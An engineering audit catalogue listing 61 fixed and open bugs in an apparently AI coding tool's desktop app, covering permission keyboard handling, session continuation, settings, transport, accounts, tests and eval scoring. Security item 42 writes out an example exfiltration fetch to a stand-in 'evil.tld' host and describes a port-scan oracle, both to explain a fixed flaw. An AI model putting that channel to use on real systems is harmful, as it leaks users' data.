# Bug catalogue — 2026-07-14 .. 2026-07-28

Every defect found auditing `bcfe0db..5433af8` (237 commits, 538 files, +79.6k lines).
Companion to [`2026-07-28-two-week-audit-sweep.md`](2026-07-28-two-week-audit-sweep.md),
which covers method and verification. This file is only the bugs.

**All of these were live while `bun test app/` reported 1711 pass / 0 fail.**

Line numbers are as of `5433af8` and have since moved; they show the mechanism was
traced, not a current address. Status is as of `d7efb92`.

---

## Permissions — the worst of it

**1. Pressing Deny allowed the tool.** `App.tsx:1735-1771`
With a permission pending, tabbing to the card's own **Deny** button and pressing
Enter *allowed* the command. The global Enter shortcut treated any target that was
not an `INPUT`/`TEXTAREA` as "nobody is typing", mapped Enter to allow, and then
called `preventDefault()` — which suppressed the browser's Enter-to-click on the
button the user had actually focused. The same mechanism hit the "Always allow"
buttons, every composer popover, and Tasks dialog rows.
→ **Fixed** `343c6ce`. The shortcut now yields to any focused control or dialog.
→ **Unexercised.** No test in `app/` can press a key.

**2. One Enter resolved two unrelated requests.** `App.tsx:1682-1685, 1808` + `AskQuestionFlow.tsx:118-191`
When a turn issued parallel tool calls, a permission request and an
`AskUserQuestion` could be pending together. Both keyboard handlers were live, and
event propagation is target → document → window, so a single Enter **allowed the
Bash command and then submitted the question answer**. Answering a question
silently approved an unrelated command. Escape mirrored it.
→ **Fixed** `343c6ce`. The shortcut stands down while a question or plan review owns the keyboard.
→ **Unexercised.**

**3. A malformed question could be bare-allowed by mouse but not keyboard.** `askQuestionState.ts:132-144`
An `AskUserQuestion` whose payload failed narrowing fell through to the generic
permission card. Clicking Allow sent `{behavior:'allow', updatedInput:{}}`, so the
tool ran with **no answers** — the exact "bare allow" the code comment forbids. The
keyboard path correctly refused, so mouse and keyboard disagreed.
→ **Fixed** `d1a8c20`. That card is now deny-only.

**4. ⌘K killed a running background task.** `TasksDialog.tsx:86-92`
The `k` = stop-task shortcut had no modifier guard. Opening the Tasks dialog from
the command palette, then pressing ⌘K to reopen the palette, opened the palette
**and stopped the first running task**. No confirmation, no undo.
→ **Fixed** `d1a8c20`.

**5. The double-submit guard was display-only.** `App.tsx:1687-1708`
Two Enters in one frame sent two responses for one request; the sidecar rejected
the second, and the error handler then *un-marked* the card as submitted,
re-enabling Allow/Deny on an already-answered request.
→ **Fixed** `343c6ce`. (Security boundary always held — the sidecar is the gate.)

---

## Deferred continuation — three ways to lose a session

**6. An unusable store blocked every prompt in every session.** `deferredContinuation.ts:363, 731-744`
The store's private-directory validation threw *outside* the try/catch, and the
caller converted **any** exception into "block this prompt". One `sudo cat-code`
run leaves the directory root-owned, and from then on every prompt in every
session is silently dropped. The message told the user to run
`/continue-after-limit cancel` — **which called the same validation and threw the
same error.** Also triggered by a 0755 config dir or a uid-mismatched mount.
→ **Fixed** `fdca782`. An unreadable store provably holds no job, so it now allows.

**7. A crashed job bricked the session permanently.** `deferredContinuation.ts:923-935` → `deferredContinuationRunner.ts:756`
Reconciliation is the *only* exit from `state:'submitted'`, and it called a
transcript read that rejects any project dir with group/other permission bits —
**true for 16 of 60 real project dirs on this machine**. It had no try/catch. So a
crash mid-attempt left a session that refused every message, refused `cancel`, and
retried the throwing reconcile once a second forever.
→ **Fixed** `fdca782`. Submitted jobs always have a terminal exit now.

**8. A successful continuation reported "Stopped, needs you".** `deferredContinuationRunner.ts:151-156`
Autocompaction splices messages out of the array **in place** — the same array the
classifier later searches for the attempt's own message. Quota limits only happen
on long conversations, which is exactly when the continuation turn compacts. So
work that finished fine was written to history as needing attention.
→ **Fixed** `fdca782`.

**9. The poll loop stopped itself permanently, twice.** `useDeferredContinuation.ts:72-77, 122`
Two branches returned without re-arming the timer. One fired on a benign concurrent
write (the file being renamed under it), rendered a *terminal* "stopped" message for
a healthy job, and never polled again. The sibling failure branch did re-arm, which
shows the omission was accidental.
→ **Fixed** `fdca782`.

**10. A 1 Hz filesystem poll ran forever in every session.** `useDeferredContinuation.ts:92-100`
Feature used or not: ~10 `mkdir` + ~12 `lstat` per second, forever, plus a wakeup
per second — against a documented idle baseline of ~0.3 wakeups/s. It also created
the store directories on every machine whether or not the feature was ever used.
→ **Fixed** `fdca782`. Backs off when no job exists.

**11. Two durable writes skipped the lock-ownership check.** `deferredContinuation.ts:773, 779`
Every other durable transition re-asserts the lock; these two did not. A process
suspended past the 120 s stale threshold (laptop sleep, swap) could wake and
tombstone a job another process was actively running.
→ **Fixed** `fdca782`.

**12. Headless `--print --resume` could become a second writer.** `print.ts:725-737`
Interactive prompts cancel a pending continuation; headless never did. A 10-minute
headless run whose worker became due at T+3min had both appending to the same
transcript.
→ **Fixed** `7a54507`.

---

## Provider routing

**13. A resumed GPT session could be switched onto Anthropic mid-conversation.** `sessionRestore.ts` / `state.ts:887-893`
`setProviderSwitchLocked(true)` had exactly **one caller in the whole repo** — the
desktop sidecar. The terminal engine never armed it, so on `cat-code --resume` the
model picker offered Sonnet/Opus/Haiku and selecting one moved a Codex-shaped
transcript onto a provider whose tool schema does not match it (apply_patch vs the
Edit object schema). The guard message never fired.
→ **Fixed** `c20ce67`. One shared predicate, both planes.

**14. `settings.json` silently beat `CLAUDE_CODE_USE_OPENAI`.** `main.tsx:2141-2150`
A leftover `{"model":"sonnet"}` counted as an explicit provider choice, so the env
var was ignored with no notice. Contradicted both CLAUDE.md §5 and the comment
sitting next to the code.
→ **Fixed** `c20ce67` (CLI) and `595ed28` (desktop — same bug, both planes).

**15. Picking "Default" in `/model` discarded the effort just chosen.** `model.tsx:36` / `effort.ts:32`
Set effort to `low`, pick the Default row: settings.json says `low`, the session
sends the model default, the status bar shows the default — and the confirmation
line claims "Set model to Default with low effort".
→ **Fixed** `c20ce67`.

---

## Settings

**16. Writing an overridden setting destroyed the control you just used.** `settingsScope.ts:557-571`
Under "My defaults", a setting the project overrides rendered as a live toggle.
Flipping it wrote the user file — and on the very next snapshot that row became
`{kind:'unreadable'}` with no write target, so it rendered as the literal word
`unknown` with no control. The operator could not see what they wrote, could not
undo it, and was never told their own edit caused it. Both endpoints were
unit-tested in isolation; the transition between them was not.
→ **Fixed** `a7859cd` + `27c2a4a` (renderer and sidecar halves).

**17. Five live panes rendered nowhere.** `App.tsx:2392-2403`
The Settings rebuild deleted workspace trust, live permission rules, effective
settings, launch flags and engine diagnostics, citing the metadata inspector as
their new home. The inspector was mounted **without its state prop**, and
`buildSessionInspectorState` had zero call sites. Two auditors found this
independently.
→ **Fixed** `343c6ce`.

**18. "Search settings" could not find a setting.** `settingsScope.ts:409-422`
It matched rail *category* labels only. Typing `gitignore`, `output style`,
`retention`, `effort` — every real setting name — returned "No matches".
→ **Fixed** `a7859cd`.

**19. An unset row could not persist the value it was showing.** `SettingsEditors.tsx:392-403`
To pin `cleanupPeriodDays: 30` when 30 is already the default, you type 30 and
blur — and a `!== value` guard sends nothing, with no error. Enum rows were worse:
a `<select>` fires no change event when you re-pick the selected option.
→ **Fixed** `a7859cd`.

**20. The permissions default-mode row ignored the chosen scope.** `SettingsShell.tsx:588-634`
It showed the globally resolved value under a heading promising "your own settings,
the same for every project". Switching scope showed the identical value.
→ **Fixed** `a7859cd`.

**21. "No session is open" was shown while a session was open.** `settingsReadState.ts:45-46`
Displayed whenever the snapshot was null — which also happens when the sidecar's
read threw, during the attach window, and after any lifecycle frame. A crashed-but-
visible tab made the whole surface deny the session existed.
→ **Fixed** `a7859cd`.

---

## Sidebar and shell

**22. Dragging one workspace demoted the ones you never touched.** `sidebarWorkspaceOrder.ts:227`
The "freeze the visible order on first drag" rule folded in only the *search-filtered*
groups. Search, drag two groups, clear the search — and the hidden workspaces have
warped from the top of the rail to the bottom, permanently, across relaunch.
→ **Fixed** `149e983`.

**23. The saved split never restored, and the layout stopped persisting.** `App.tsx:993`
Two id lists were joined into one string, so `pane=[X],restorable=[Y]` and
`pane=[X,Y],restorable=[]` produced the same key. The restore effect never re-ran,
so the split never re-formed — and because the persist effect is blocked until
restore settles, **the layout was never written to disk again for the rest of the run**.
→ **Fixed** `779f9d7`.

**24. The branch strip read "none" for every session.** `App.tsx:1868`
It looked up a row by `appSessionId` against a field holding `engineSessionId`.
The file already documents this exact trap 950 lines earlier and gets it right there.
→ **Fixed** `343c6ce`.

**25. The drop indicator promised a move that release would not perform.** `Sidebar.tsx:564-589`
No `onDragLeave` anywhere in the file. Drag over a group's session rows and the
indicator stayed painted on a header ~170px away, while releasing did nothing.
→ **Fixed** `149e983`.

**26. ⌥↓ reordering worked once, then stopped.** `Sidebar.tsx:615-632`
Moving a group down makes React re-insert the moved DOM node, which blurs it, so
the second press went nowhere. ⌥↑ was unaffected, making it read as "down is broken".
→ **Fixed** `149e983`.

**27. A blank row in the project picker.** `sessionsCatalogState.ts:604`
A history row with an unreconcilable workspace produced `name: ''`, rendering an
empty label plus a chevron. The sidebar handled the same input correctly as
"Unknown workspace" — the two surfaces disagreed. An existing test *asserted* the
blank label.
→ **Fixed** `149e983`.

**28. A tab read its internal UUID aloud.** `TabBar.tsx:261`
`aria-label` embedded the raw `appSessionId`, so a screen reader announced
"Session cat-code (a3f1c2e8-…-9b), live".
→ **Fixed** `149e983`.

---

## Transcript and transport

**29. One oversized frame erased the entire replay ring.** `replayBuffer.ts:185-191`
The outbound frame ceiling is 32 MiB, deliberately large so images and big tool
results are not dropped. The replay ring's byte budget is 8 MiB. A 9 MiB frame hit
a branch that cleared **every retained frame for that session** — so a renderer
reload showed an empty transcript, and the at-rest preview cache became a stub.
Undocumented and untested: the existing test recorded nothing before the oversized frame.
→ **Fixed** `7a54507`.

**30. A session that never completed a turn loaded a shimmer forever.** `main.ts:266-272`
The zero-frame guard ran on the *pre-distill* snapshot, which always has content.
After distilling, the cache was empty but non-null, so the UI sat in a pulsing
`aria-busy` skeleton indefinitely. A test asserted this as intended.
→ **Fixed** `7a54507`.

**31. Reasoning steps re-parsed their Markdown on every stream delta.** `reasoningLayout.ts:213`
No identity cache, so the memo that exists to prevent exactly this could never hit.
Default layout, every GPT delta — and again on any unrelated state change, such as
opening a tool's output.
→ **Fixed** `82a7f0c`.

**32. A redelivered user frame re-rendered the whole transcript.** `transcriptProjector.ts:605`
Dedupe ran *after* result folding — the reverse of the assistant path, whose comment
says a replayed duplicate "must be a total no-op, including its result-correlation
side effect".
→ **Fixed** `82a7f0c`. Partially: a frame carrying only a tool_result still churns (open).

**33. The truncation banner had no warning styling.** `App.tsx:3202, 3302`
`border-tone-warning` / `text-tone-warning` are not real utilities — the theme
defines `tone-warn`. Tailwind emitted nothing, so the only signal that a transcript
was incomplete rendered as ordinary body text. SSR tests emit the class string
regardless, so they could not see it.
→ **Fixed** `343c6ce`.

**34. A stale cache was served forever.** `transcriptCache.ts:164`
`writtenAt` was stamped and read by nothing. A session backfilled once and then
continued for 30 turns in the CLI kept previewing the old transcript.
→ **Fixed** `7a54507`.

**35. One bad stdout line abandoned every queued session.** `transcriptBackfill.ts:178-196`
A prior fix hardened the worker but not the runner, whose JSON-parse branch still
terminated the whole run. That branch fires on *any* non-NDJSON byte — and the
worker imports the full engine graph, none of which is contractually stdout-silent.
This is the shape of the outage that lost 30 of 32 caches.
→ **Fixed** `7a54507`.

---

## Accounts and lifecycle

**36. A signed-in user was told to sign in, every 60 seconds.** `accountsPoolWorker.ts:47`
The worker ran the engine in bare mode, where credential discovery short-circuits
to "none". So it reported every Anthropic route absent on every poll, and the
renderer *prefers* that snapshot over the session's correct one. A subscription
user never saw their account chip; a token-only user got the first-run sign-in
surface re-asserted every minute on a fully authenticated app.
→ **Fixed** `27c2a4a`.

**37. Parking could kill a token refresh and quarantine a healthy account.** `sidecarServer.ts:1160-1165`
The park gate knew about turns, permissions and tasks — not in-flight account verbs.
A park firing mid-refresh exited the process with the vault marked `in_flight` and
the lock orphaned, so every other process throwing, and after the grace window the
account was **quarantined by a park, not by any auth failure**.
→ **Fixed** `27c2a4a`.

**38. Accounts was fully interactive with no session, and every button did nothing.** `App.tsx:1086-1102`
The page needs no session to render (that was the point of the redesign), but every
verb began `if (!activeSessionId) return`. Clicking Delete and confirming left the
dialog open **forever**, with no toast and no error. Switch was silent.
→ **Fixed** `343c6ce` (honest failure message; host-plane routing parked).

**39. Two long-lived workers were never killed on quit.** `main.ts:413-457`
Spawned without an abort signal; quit only cleared the next timer. ⌘Q mid-run
orphaned a process holding the full ~189 MB engine graph — invisible to every
reaper, because they match a different command marker. The transcript backfill
right next to them was wired correctly.
→ **Fixed** `7a54507`.

**40. Account writes resolved against a pool loaded once at spawn.** `accountsDomain.ts:572`
Sign in an account elsewhere; the page shows it within 60 s, but clicking Switch
from an older session says "That account is no longer in the pool" — permanently,
until that sidecar restarts.
→ **Fixed** `27c2a4a` (re-read on miss). Symmetric half — a deleted account still
resolving from a stale pool — remains open.

**41. The Accounts page lagged a minute behind its own writes.** `accountsState.ts:140-156`
Renaming an account showed a success toast while the row kept the old alias for up
to 60 s, with no manual refresh.
→ **Fixed** `343c6ce`.

---

## Security

**42. A compromised renderer could make the sidecar phone home.** `sidecarServer.ts:3157` → `remoteSettingsDomain.ts:205`
`remoteSettings.directConnect` validated its URL as `string().min(1).max(4096)` and
nothing else. A renderer frame could make the **privileged** sidecar issue
`fetch('https://evil.tld/<4000 chars>/sessions')` carrying the session's absolute
working directory, with the reply echoed back — a bidirectional channel at ~480 KB/s.
This defeats the `connect-src 'self'` policy that exists to stop exactly that.
Failure text was returned verbatim, making it a localhost port-scan oracle too.
**Predates the audit window.**
→ **Fixed** `27c2a4a`: scheme allowlist, credentials and query/fragment rejected,
accept+reject boundary tests. **Host policy parked** — `https://evil.tld` is still
reachable; loopback-only vs. an allowlist is a product decision.

**43. Direct-connect fetches were abandoned, never aborted.** `remoteSettingsDomain.ts:150-175`
The timeout rejected the promise but left the socket open (~75 s), and nothing
bounded concurrency. A renderer looping at the frame-rate cap could accumulate
thousands of sockets in the privileged process until fd exhaustion took every other
engine network call with it.
→ **Fixed** `27c2a4a`.

**44. Error frames bypassed the outbound secret scan.** `sidecarServer.ts:2728`
Raw engine exception text reached the renderer, including absolute vault paths —
which the security baseline lists as a forbidden crossing. The guard's own comment
claimed it ran on every outbound frame.
→ **Fixed** `27c2a4a` (path redaction + length cap) and `595ed28` (comment corrected).

**45. Two identical question texts collapsed into one answer.** `sidecarServer.ts:3437`
The answer map was keyed by question *text*, so a tool asking the same question
twice passed every length and validity check, then silently delivered a partially
answered result while the boundary reported success.
→ **Fixed** `27c2a4a`.

**46. A build-time feature macro read false in a process that is never bundled.** `permissionDomain.ts:20`
The classifier flag was hardcoded off — see **open item A** below, of which this is
one instance.
→ **Fixed** `27c2a4a`.

---

## Tests that could not fail

**47. Eighteen tests passed over a broken main process.** `mainSource.test.ts`
18 tests, 19 reads of `main.ts`'s own source, zero production code executed. Proven
by mutation: with the renderer bridge changed to **never translate an event**,
single-use cwd tokens made **infinitely reusable**, and backfill reading the
**oldest** rows — all 18 still passed. Ordering assertions proved textual order, not
execution order.
→ **Fixed** `b0c27cf`. Logic extracted to an Electron-free module; the replacement
fails 4 tests on those same mutations.

**48. Test mocks poisoned every suite in the same run.** `QueryEngine.deferred.test.ts` and 2 others
The deferred suites reported **31 pass / 16 fail** together while each passed alone.
The casualty was the durable-barrier test — the crash-safety evidence for the whole
subsystem — so anyone widening their test command would have seen the safety net
fail and eventually weakened it. `mock.module` is installed at **import** time for
the whole invocation, so an `afterAll` restore cannot work (measured twice).
→ **Fixed** `10dfbef` via dependency injection. Now 56/0 together.

**49. The regression test for the backfill outage tested the wrong file.** `transcriptBackfill.test.ts:174`
It drove a runner the fix never touched and passed identically on the pre-fix tree.
The line actually fixed had **zero** coverage.
→ **Fixed** `ba63dcf`.

**50. A wait helper returned silently on timeout.** `host.test.ts:265`
~30 waits degraded to "sleep, then continue regardless", so later assertions could
pass for the opposite reason.
→ **Fixed** `ba63dcf`.

**51. A test named for three interactions called one function three times.** `previewTranscriptState.test.ts:196`
It proved `Set.add` is idempotent. None of the three real entry points was executed.
(The "dwell" path in its name had already been deleted.)
→ **Fixed** `b0c27cf`.

**52. Three keyboard-named tests never ran a keyboard handler.** `sidebarWorkspaceOrder.test.ts:201`
Invert the up/down mapping, or drop the modifier guard so bare arrows reorder the
sidebar, and all stayed green.
→ **Fixed** `149e983`.

**53. The user-visible-text guard certified the violations it existed to prevent.**
It banned eight phrases but not source citations, session ids, `MAX_*`, `seam` or
`allowlist` — and scanned only the renderer, despite its commit claiming repo-wide.
→ **Fixed** `b0c27cf`. Now covers main/host/sidecar; found 11 real violations.

---

## Rendered engineering notes (operator text rules)

All fixed in `a7859cd`, `d1a8c20`, `149e983`, `4899172`, `9b7ef70`.

- A literal source citation on screen: *"…identically as cliArg
  (src/utils/permissions/permissionSetup.ts:1015-1035)… Splitting them needs the
  engine tag fix."*
- The session id `P4-7` on the **default** Settings landing pane, plus a "Scope flags"
  block listing what is deferred.
- A drawer explaining *"App passes no sessionState"* to the user.
- Three Memory-panel sentences about withheld payloads and undesigned writers.
- `BRIDGE_SAFE_COMMANDS allowlist` as a card subtitle.
- Raw enums as labels: `dontAsk`, `acceptEdits`, `localSettings`, `cliArg`, `exact`,
  `AutoMem`, and an ISO timestamp.
- *"Transcript is too large to export over the desktop transport"*.
- Em dashes in user-facing text in `openHistorySession.ts` and `registry.ts` —
  outside the guard's scan root, so never seen.

---

## Dead code and unconsumed contracts

- **Five wire fields built, serialized, and read by nothing** — `ExtensionsSnapshot.notes`
  (4 honesty notes silently dropped while `protocol.ts` claimed they displayed),
  `AgentConfigSnapshot.notes`, `SessionsCatalogSnapshot.notes`, plus
  `availableMcpServers` and `MemorySnapshot.notes` still open. → `4899172`, `9b7ef70`
- **`BannerStack`** — a Fast-Refresh compliance pass split a component mounted
  nowhere into *two* dead files, and gave the second a green test suite. → parked
- **Four orphaned surfaces** — `WorkspaceTrustSection`, `DiagnosticsSection`,
  `BannerStack`, `ResolutionOrderLegend`: zero importers. **Deletion parked** — the
  docs still treat them as live work, and one holds the only implementation of data
  that currently renders nowhere.
- **Two dead exported runners** in the continuation subsystem. → `fdca782`
- **The parity ledger claimed a wired surface that renders nowhere**, which is what
  sessions read before coding a surface. → `4899172`

---

## Dev-loop and tooling hazards

**54. The dev-mode trap had no test.** `prepare-dev-electron.ts`
Electron decides "am I packaged" from the **executable's name**. Renaming the dev
binary silently loads a stale bundle, kills hot reload, and switches off every
dev-gated surface — while the suite stays green. This cost hours undiagnosed on
2026-07-28. The only protection was a code comment.
→ **Fixed** `02537fd`, proven by reintroducing the exact regression.

**55. A recipe bump `rm -rf`'d the bundle a live app was running from.** `prepare-dev-electron.ts:65`
→ **Fixed** `02537fd` (version-scoped paths).

**56. The RAM probes SIGKILLed recycled PIDs.** `ram-fleet.ts:183`
Victims are designed to exit early, so their PIDs are free for reuse — and cleanup
killed by raw PID with no identity check, recursing into children. A victim exiting
at t+5s whose PID the OS reused for the operator's dev app would take it out at t+60s.
→ **Fixed** `02537fd`.

**57. Probe output was gitignored nowhere**, so it accreted in a shared tree where
every other session had to treat it as someone's in-flight work. → **Fixed** `02537fd`

---

## Measurement harness

**58. The eval's transcript cleanup was dead code.** `save-side.ts:790`
It parsed a result object out of what is actually a JSON **array**, so the guard
never fired and every run leaked a transcript into the real session store — the
exact accumulation the commit claimed to fix.
→ **Fixed** `74dbbbc`.

**59. The scorer punished the behaviour it was testing for.** `run.ts:87-116`
Reproduced by executing the shipped scorers: an answer citing the git-log evidence
the harness itself grants scored **REVIEW**; the same answer without the citation
scored **PASS**. The published table measured terseness as much as memory behaviour.
→ **Fixed** `74dbbbc`.

**60. Verify-cases were unanswerable by construction.** `run.ts:395-407`
The harness allowed only `git log`, but one case's ground truth lives in
`package.json` and another needs a grep. Those runs could only ever land in REVIEW.
→ **Fixed** `74dbbbc`.

**61. Raw transcripts collided across efforts**, so a REVIEW verdict could be
adjudicated from the wrong run's artifact. → **Fixed** `74dbbbc`

> **Any previously published eval results need re-baselining.**

---

## Still open

**A. The desktop and the terminal run different engines.**
The sidecar is spawned unbundled and `feature()` is a build-time macro, so **911
call sites across 87 flags evaluate false there**. `./cli-dev` enables 37 of them —
463 call sites, **436 outside the TUI**. Consequences that change behaviour:

- the desktop parses Bash with a **different parser**, and Bash *permission analysis*
  is built on that parse — **the security-relevant one**
- built-in Explore/Plan subagents exist in the terminal, not the app
- memory extraction and agent memory snapshots never run in the desktop

On record as "ruling #1", open since 2026-07-21, while `app/` shipped on top of it.
Needs a decision, not a patch.

**B. Three test suites still leak module mocks** — `Settings/Usage.test.tsx`,
`Settings/Settings.test.tsx`, `codex-core/accounts.test.ts`. 10–13 unconditional
mocks each; the last is the cross-process token-rotation file CLAUDE.md §6 fences off.

**C. Two unread wire fields remain** — `availableMcpServers`, `MemorySnapshot.notes`
(now shipping `notes: []` purely to satisfy the contract).

**D. Four deletions parked** pending your call, since the docs still treat those
files as live work.

**E. Bugs 1 and 2 are fixed but unexercised.** No test in `app/` can press a key —
`App` takes no props, its data arrives through effects `renderToStaticMarkup` never
runs, and there is no jsdom in the tree. **One keypress settles it: with a Bash
permission pending, Tab to Deny and press Enter. It must deny.**
